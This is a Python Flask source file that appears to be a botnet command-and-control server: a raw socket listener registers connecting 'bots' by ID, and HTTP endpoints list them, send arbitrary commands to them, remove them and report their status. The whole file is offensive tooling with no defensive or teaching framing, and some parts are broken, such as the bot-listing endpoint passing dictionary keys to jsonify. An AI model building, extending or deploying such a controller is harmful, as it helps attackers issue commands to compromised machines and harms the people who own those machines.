from flask import Flask, request, jsonify
import socket
import threading

app = Flask(__name__)

bots = {}

class BotHandler(threading.Thread):
    def __init__(self, client_socket, bot_id):
        super().__init__()
        self.client_socket = client_socket
        self.bot_id = bot_id

    def run(self):
        try:
            while True:
                command = self.client_socket.recv(1024).decode('utf-8')
                if not command:
                    break
                print(f"Command from bot {self.bot_id}: {command}")
        except Exception as e:
            print(f"An error occurred with bot {self.bot_id}: {e}")
        finally:
            self.client_socket.close()
            del bots[self.bot_id]
            print(f"Bot {self.bot_id} disconnected")

def bot_listener():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 4448))
    server_socket.listen(5)
    print("Listening for bot connections...")

    while True:
        client_socket, addr = server_socket.accept()
        bot_id = client_socket.recv(1024).decode('utf-8')
        bots[bot_id] = client_socket
        print(f"Bot {bot_id} connected from {addr}")
        handler = BotHandler(client_socket, bot_id)
        handler.start()

@app.route('/add_bot', methods=['POST'])
def add_bot():
    data = request.json
    bot_id = data['id']
    info = data.get('info', 'No info provided')
    if bot_id in bots:
        return jsonify({"message": "Bot already connected"}), 400
    return jsonify({"message": f"Bot {bot_id} added"}), 200

@app.route('/remove_bot', methods=['POST'])
def remove_bot():
    data = request.json
    bot_id = data['id']
    if bot_id in bots:
        bots[bot_id].sendall(b'exit')
        return jsonify({"message": f"Bot {bot_id} removed"}), 200
    return jsonify({"message": "Bot not found"}), 404

@app.route('/list_bots', methods=['GET'])
def list_bots():
    return jsonify(bots.keys()), 200

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data['id']
    command = data['command']
    if bot_id in bots:
        bots[bot_id].sendall(command.encode('utf-8'))
        return jsonify({"message": f"Command '{command}' sent to bot {bot_id}"}), 200
    return jsonify({"message": "Bot not found"}), 404

@app.route('/get_status', methods=['GET'])
def get_status():
    bot_id = request.args.get('id')
    if bot_id in bots:
        return jsonify({"status": "connected"}), 200
    return jsonify({"status": "disconnected"}), 404

if __name__ == "__main__":
    threading.Thread(target=bot_listener).start()
    app.run(port=5000)
